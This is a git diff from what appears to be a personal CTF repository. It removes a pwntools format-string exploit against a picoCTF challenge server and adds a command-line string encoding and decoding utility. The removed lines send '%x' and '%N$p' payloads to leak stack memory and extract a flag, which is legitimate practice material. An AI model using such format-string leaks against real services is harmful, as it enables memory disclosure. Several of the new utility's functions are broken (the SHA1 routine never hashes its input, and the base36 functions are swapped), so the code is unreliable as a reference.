@@ -1,79 +1,425 @@
-#!/bin/bash/env python3
+#!/usr/bin/python3
+# -*- coding:utf-8 -*-
+'''
+name: string_converter
+author: krakenbinary
+description: this script is meant to filter a string through various
+    conversion techniques and find the best fit. So, lets see how that goes.
 
-#cstr=[112, 105, 99, 111, 67, 84, 70, 123, 103, 48, 48, 100, 95, 107, 49, 116, 116, 121, 33, 95, 110, 49, 99, 51, 95, 107, 49, 116, 116, 121, 33, 95, 53, 102, 98, 53, 101, 53, 49, 100, 125, 10]
-#y=''
-#for x in cstr:
-#	y+=chr(x)
-#print (y)
+Current Issues:
+    - base92 download and install issue
+    - base62 download and install issue
 
-#from pwn import *
-#import sys
-#import codecs
-#
-#f = open("stonksdump.txt", "a")
-#
-#
-#for i in range(1, 100):
-#    r = remote('mercury.picoctf.net', 33411)
-#    r.sendlineafter("2) View my portfolio", "1")
-#    r.sendlineafter("What is your API token?", '%{}$p'.format(i))
-#    r.recvline()
-#    r.recvline()
-#    leak = r.recvline()
-#    data = leak.strip()[2:]
-#    print(i)
-#    print(data)
-#    if 'il' not in data:
-#        if len(data)%2 == 0:
-#            newdat = codecs.encode(codecs.decode(data, 'hex')[::-1], 'hex').decode()
-#            f.write(str(i) + ": " + newdat.strip().decode("hex") + '\n')
-#            print(str(i) + ": " + newdat.strip().decode("hex") + '\n')
-#        else:
-#            f.write(str(i) + ": " + leak.strip() + '\n')
-#            print(str(i) + ": " + leak.strip() + '\n')
-#    r.close()
-
-# import pwntools
-from pwn import *
-
-# string to write to
-s = ""
-
-# open up remote connection
-r = remote('mercury.picoctf.net', 49039)
-
-# get to vulnerability
-r.recvuntil("View my") #First input prompt
-r.send("1\n") # send first input
-r.recvuntil("What is your API token?\n") # next input prompt
-
-# send string to print stack
-r.send("%x" + "-%x"*40 + "\n") # format string vunerability
-
-# receive until the line we want
-r.recvline()
-
-# read in line
-x = r.recvline()
-
-# remove unwanted components
-x = x[:-1].decode() #Remove 
-
-# parse to characters
-for i in x.split('-'):
-    if len(i) == 8:
-        a = bytearray.fromhex(i)
-
-# use this if you need to reverese things in case you have a endianness issue
-#        for b in reversed(a): 
-#            if b > 32 and b < 128: # be sure to set an upper and lower limit!!!
-#                s += chr(b)
+Notes on Import usage:
+    - hashlib: encryption_decryption(md5, sha1)
+    - urllib.parse(quote, unquote: encryption_decryption(md5, sha1)
+    - argparse: encryption_decryption(md5, sha1)
+    - base36: encryption_decryption(md5, sha1)
+    - base58: encryption_decryption(md5, sha1)
+    - base64: encryption_decryption(md5, sha1)
+    - base91: encryption_decryption(Base16, Base32, Base64, Base85)
+        It should be noted that base64 contains base85 encryption and decryption:
+            - python3 Medium a85encode:
+                ASCII85 encoding. This is the default. 0x00000000 is compressed
+                to z. Spaces are not compressed.
+            - python3 Medium b85encode:
+                Character set from RFC1924 which is an April fools joke.
+                Spaces and zeroes are not compressed.
+                from urllib import quote, unquote
+'''
 
 
-        for b in reversed(a):
-            if b > 0 and b < 128: # be sure to set an upper and lower limit!!!
-                 s += chr(b)
+import argparse  # sudo apt-get install python-argparse
+import hashlib  # pip install hashlib
+import base36  # pip install base36
+import base58  # pip install base58
+# import base62  # pip install pybase62
+import base64  # pip install pybase64
+import base91  # pip install base91
+# import base92  # pip install pybase64
+# import binascii - no idea :/
+from pwnlib.tubes.remote import remote
+from urllib.parse import quote, unquote
 
-# print string
-print(s)
-r.close()
+"""
+def connect():
+    '''connect'''
+    tcp_ip = 'mercury.picoctf.net'
+    tcp_port = 49039
+
+    # open up remote connection
+    target_rm = remote(tcp_ip, tcp_port)
+    get_con_data(target_rm)
+
+
+def get_con_data(target_go):
+    '''snag the data'''
+    str_raw = target_go.recvallS()  # recvall() is for bytes
+    str_raw_strip = str_raw.replace('\n', '').strip()
+    print(str_raw_strip)
+
+
+connect()
+"""
+
+def menu():
+    # usage = """ -m MD5 encryption(32-bit lowercase) -s SH1 encryption -h Show help information -b64 Base64 encode -b32 Base32 encode -b16 Base16 encode -b85_1 Base85_1 encode -b85_2 Base85_2 encode -b36 Base36 encode -b58 Base58 encode -b91 Base91 encode -db64 Base64 decode -db32 Base32 decode -db16 Base16 decode # can -db85_1 Base85_1 decode -db85_2 Base85_2 decode -db36 Base36 decode -db58 Base58 decode -db91 Base91 decode -urlen URL encode -urlde URL decode -bin Binary To Decimal # Binary to decimal -octal Octal to Decimal # Octal to decimal -hex Hexadecimal to Decimal # Hexadecimal to decimal -dbin Decimal To Binary # Decimal to binary -doctal Decimal to Octal # Decimal to octal -dhex Decimal to Hexadecimal # Decimal to hexadecimal -ord Letter To ASCII # Letter to ASCII Example -ord asdfasfa -ord='dfafs afasfa asfasf' -chr ASCII To Letters #ASCII To letters Example -chr 105 -chr = '102 258 654' """
+    # In the use of ord and chr Note that if the characters and numbers entered do not contain spaces, the commands in front of the practical example will be used directly. If spaces are included, the commands behind will be used
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-m', dest='md', help='MD5 encryption')
+    parser.add_argument('-s', dest='sh', help='SH1 encryption')
+    parser.add_argument('--h', action="store_true", help='Show help information')
+    parser.add_argument('-b64', dest='b64', help='Base64 encode')
+    parser.add_argument('-b32', dest='b32', help='Base32 encode')
+    parser.add_argument('-b16', dest='b16', help='Base16 encode')
+    parser.add_argument('-b85_1', dest='b85_1', help='Base85_1 encode')
+    parser.add_argument('-b85_2', dest='b85_2', help='Base85_2 encode')
+    parser.add_argument('-b36', dest='b36', help='Base36 encode')
+    parser.add_argument('-b58', dest='b58', help='Base58 encode')
+    parser.add_argument('-b91', dest='b91', help='Base91 encode')
+    parser.add_argument('-db64', dest='db64', help='Base64 decode')
+    parser.add_argument('-db32', dest='db32', help='Base32 decode')
+    parser.add_argument('-db16', dest='db16', help='Base16 decode')
+    parser.add_argument('-db85_1', dest='db85_1', help='Base85_1 decode')
+    parser.add_argument('-db85_2', dest='db85_2', help='Base85_2 decode')
+    parser.add_argument('-db36', dest='db36', help='Base36 decode')
+    parser.add_argument('-db58', dest='db58', help='Base58 decode')
+    parser.add_argument('-db91', dest='db91', help='Base91 decode')
+    # parser.add_argument('-dbfamily', dest='dbfamily', help='basefamily decode')
+    parser.add_argument('-urlen', dest='urlen', help='URL encode')
+    parser.add_argument('-urlde', dest='urlde', help='URL decode')
+    parser.add_argument('-bin', dest='bin', help='Binary To Decimal')
+    parser.add_argument('-octal', dest='octal', help='Octal to Decimal')
+    parser.add_argument('-hex', dest='hex', help='Hexadecimal to Decimal')
+    parser.add_argument('-dbin', dest='dbin', help='Decimal To Binary ')
+    parser.add_argument('-doctal', dest='doctal', help='Decimal to Octal ')
+    parser.add_argument('-dhex', dest='dhex', help='Decimal to Hexadecimal')
+    parser.add_argument('-ord', dest='ord', help='Letter To ASCII')
+    parser.add_argument('-chr', dest='chr', help='ASCII To Letter')
+
+    options = parser.parse_args()
+
+    if options.md:
+        s = options.md
+        md5(s)
+    elif options.sh:
+        s = options.sh
+        sh1(s)
+    elif options.b64:
+        s = options.b64
+        stringToB64(s)
+    elif options.b32:
+        s = options.b32
+        stringToB32(s)
+    elif options.b16:
+        s = options.b16
+        stringToB16(s)
+    elif options.b85_1:
+        s = options.b85_1
+        stringTobase85_1(s)
+    elif options.b85_2:
+        s = options.b85_2
+        stringTobase85_2(s)
+    elif options.b36:
+        s = options.b36
+        stringTobase36(s)
+    elif options.b58:
+        s = options.b58
+        stringTobase58(s)
+    elif options.b91:
+        s = options.b91
+        stringTobase91(s)
+    elif options.db85_1:
+        s = options.db85_1
+        base85_1Tostring(s)
+    elif options.db85_2:
+        s = options.db85_2
+        base85_2Tostring(s)
+    elif options.db36:
+        s = options.db36
+        base36Tostring(s)
+    elif options.db58:
+        s = options.db58
+        base58Tostring(s)
+    elif options.db91:
+        s = options.db91
+        base91Tostring(s)
+    # elif options.dbfamily:
+    #
+    # s = options.dbfamily
+    #
+    # basefamily(s)
+    elif options.db64:
+        s = options.db64
+        b64ToString(s)
+    elif options.db32:
+        s = options.db32
+        b32ToString(s)
+    elif options.db16:
+        s = options.db16
+        b16ToString(s)
+    elif options.urlen:
+        s = options.urlen
+        urlEncode(s)
+    elif options.urlde:
+        s = options.urlde
+        urlDecode(s)
+    elif options.bin:
+        s = options.bin
+        binToDec(s)
+    elif options.octal:
+        s = options.octal
+        octToDec(s)
+    elif options.hex:
+        s = options.hex
+        hexToDec(s)
+    elif options.dbin:
+        s = options.dbin
+        decToBin(s)
+    elif options.doctal:
+        s = options.doctal
+        decToOct(s)
+    elif options.dhex:
+        s = options.dhex
+        decToHex(s)
+    elif options.doctal:
+        s = options.doctal
+        decToOct(s)
+    elif options.dhex:
+        s = options.dhex
+        decToHex(s)
+    elif options.ord:
+        s = options.ord
+        lettToASCII(s)
+    elif options.chr:
+        s = options.chr
+        asciiToLett(s)
+    else:
+        helpInfo()
+
+
+def helpInfo():
+    print(""" -m MD5 encryption(32-bit lowercase) -s SH1 encryption -h Show help information -b64 Base64 encode -b32 Base32 encode -b16 Base16 encode -b85_1 Base85_1 encode -b85_2 Base85_2 encode -b36 Base36 encode -b58 Base58 encode -b91 Base91 encode -db64 Base64 decode -db32 Base32 decode -db16 Base16 decode -db85_1 Base85_1 decode -db85_2 Base85_2 decode -db36 Base36 decode -db58 Base58 decode -db91 Base91 decode -urlen URL encode -urlde URL decode -bin Binary To Decimal -octal Octal Decimal to Decimal -hex Hexadecimal to Decimal -dbin Decimal To Binary -doctal Decimal to Octal -dhex Decimal to Hexadecimal -ord Letter To ASCII attention： Example -ord asdfasfa -ord="dfafs afasfa asfasf" -chr ASCII To Letters attention： Example -chr 105 -chr="102 258 654" """)
+    # Conduct MD5 encryption
+
+
+def md5(s):
+    original = s
+    md = hashlib.md5()
+    s = s.encode(encoding='utf-8')
+    md.update(s)
+    print('Original:' + original)
+    print('Md5 Encryption:' + md.hexdigest())
+    # Conduct sh1 encryption
+
+
+def sh1(s):
+    original = s
+    sh = hashlib.sha1()
+    # s = s.encode(encoding='utf-8')
+    print('Original:' + original)
+    print('SH1 Encryption:' + sh.hexdigest())
+    # Convert string to base64 Coding format
+
+
+def stringToB64(s):
+    encode = base64.b64encode(s)
+    print('Original:' + s)
+    print('Base64 encode:' + str(encode))
+    # take base64 Convert the encoding format to the normal character type
+
+
+def b64ToString(s):
+    decode = base64.b64decode(s)
+    # print('Base64:' + s)
+    print('Base64 decode:' + str(decode))
+    # Convert the string to b32 Coding format
+
+
+def stringToB32(s):
+    encode = base64.b32encode(s)
+    print('Original:' + s)
+    print('Base32 encode:' + str(encode))
+    # take base32 Convert the encoding format to the normal character type
+
+
+def b32ToString(s):
+    decode = base64.b32decode(s)
+    # print('Base32:' + s)
+    print('Base32 decode:' + str(decode))
+    # Convert the string to base16 Coding format
+
+
+def stringToB16(s):
+    encode = base64.b16encode(s)
+    print('Original:' + s)
+    print('Base16 encode:' + str(encode))
+    # take base16 Convert the encoding format to the normal character type
+
+
+def b16ToString(s):
+    decode = base64.b16decode(s)
+    # print('Base16:' + s)
+    print('Base16 decode:' + str(decode))
+    # Convert the string to base85 The first kind of coding format
+
+
+def stringTobase85_1(s):
+    encode = base64.a85encode(s)
+    print('Original:' + s)
+    print('Base85_1 encode:' + str(encode))
+    # take base85 The first kind of encoding format is converted to the normal character type
+
+
+def base85_1Tostring(s):
+    decode = base64.a85decode(s)
+    # print('Base85_1:' + s)
+    print('Base85_1 decode:' + str(decode))
+    # Convert the string to base85 The second kind of coding format
+
+
+def stringTobase85_2(s):
+    encode = base64.b85encode(s)
+    print('Original:' + s)
+    print('Base85_2 encode:' + str(encode))
+    # take base85 The first kind of encoding format is converted to the normal character type
+
+
+def base85_2Tostring(s):
+    decode = base64.b85decode(s)
+    # print('Base85_2:' + s)
+    print('Base85_2 decode:' + str(decode))
+    # Convert the string to base36 Coding format
+
+
+def stringTobase36(s):
+    encode = base36.loads(s)
+    print('Original:' + s)
+    print('Base36 encode:' + str(encode))
+    # take base36 Convert the encoding format to the normal character type
+
+
+def base36Tostring(s):
+    decode = base36.dumps(int(s))
+    # print('Base36:' + s)
+    print('Base36 decode:' + str(decode))
+    # Converts a string to base58 Coding format
+
+
+def stringTobase58(s):
+    encode = base58.b58encode(str(s))
+    print('Original:' + s)
+    print('Base58 encode:' + str(encode))
+    # take base58 Convert the encoding format to the normal character type
+
+
+def base58Tostring(s):
+    encode = base58.b58decode(s)
+    print('Base58 decode:' + str(encode))
+    # Converts a string to base91 Coding format
+
+
+def stringTobase91(s):
+    encode = base91.encode(s)
+    print('Original:' + s)
+    print('Base91 encode:' + str(encode))
+    # take base58 Convert the encoding format to the normal character type
+
+
+def base91Tostring(s):
+    decode = base91.decode(s)
+    # print('Base91:' + s)
+    print('Base91 decode:' + str(decode))
+    # Convert the string to base Family bucket coding format
+    # def basefamily(s):
+    # b64ToString(s)
+    # b32ToString(s)
+    # b16ToString(s)
+    # base58Tostring(s)
+    # base91Tostring(s)
+    # base36Tostring(s)
+    # base85_1Tostring(s)
+    # base85_2Tostring(s)
+    # Conduct url code
+
+
+def urlEncode(s):
+    encode = quote(s)
+    print('Original:' + s)
+    print('URL encode:' + encode)
+    # Conduct url code
+
+
+def urlDecode(s):
+    decode = unquote(s)
+    print('URL encode:' + s)
+    print('URL decode:' + decode)
+    # Convert binary to decimal
+
+
+def binToDec(s):
+    result = int(s, 2)
+    print('Binary :' + str(s))
+    print('Decimal :' + str(result))
+    # Convert octal to decimal
+
+
+def octToDec(s):
+    result = int(s, 8)
+    print('Octal :' + str(s))
+    print('Decimal :' + str(result))
+    # Convert hex to decimal
+
+
+def hexToDec(s):
+    result = int(s, 16)
+    print('Hex :' + str(s))
+    print('Decimal :' + str(result))
+    # Convert decimal to binary
+
+
+def decToBin(s):
+    s = int(s)
+    result = bin(s)
+    print('Decimal:' + str(s))
+    print('Binary:' + str(result))
+    # Convert decimal to octal
+
+
+def decToOct(s):
+    s = int(s)
+    result = oct(s)
+    print('Decimal :' + str(s))
+    print('Octal :' + str(result))
+    # Convert decimal to hexadecimal
+
+
+def decToHex(s):
+    s = int(s)
+    result = hex(s)
+    print('Decimal :' + str(s))
+    print('Hex :' + str(result))
+    # Convert the letters to the corresponding ASCII
+
+
+def lettToASCII(s):
+    print('Letters:' + s)
+    result = ''
+    for i in s:
+        result = result + str(ord(i)) + ' '
+    print('ASCII :' + result)
+    # take ASCII Convert to the corresponding letters and characters
+
+
+def asciiToLett(s):
+    list = s.split(' ')
+    result = ''
+    print('ASCII :' + s)
+    for i in list:
+        i = int(i)
+        result = result + chr(i)
+    print('Letters :' + result)
+
+
+if __name__ == '__main__':
+    menu()
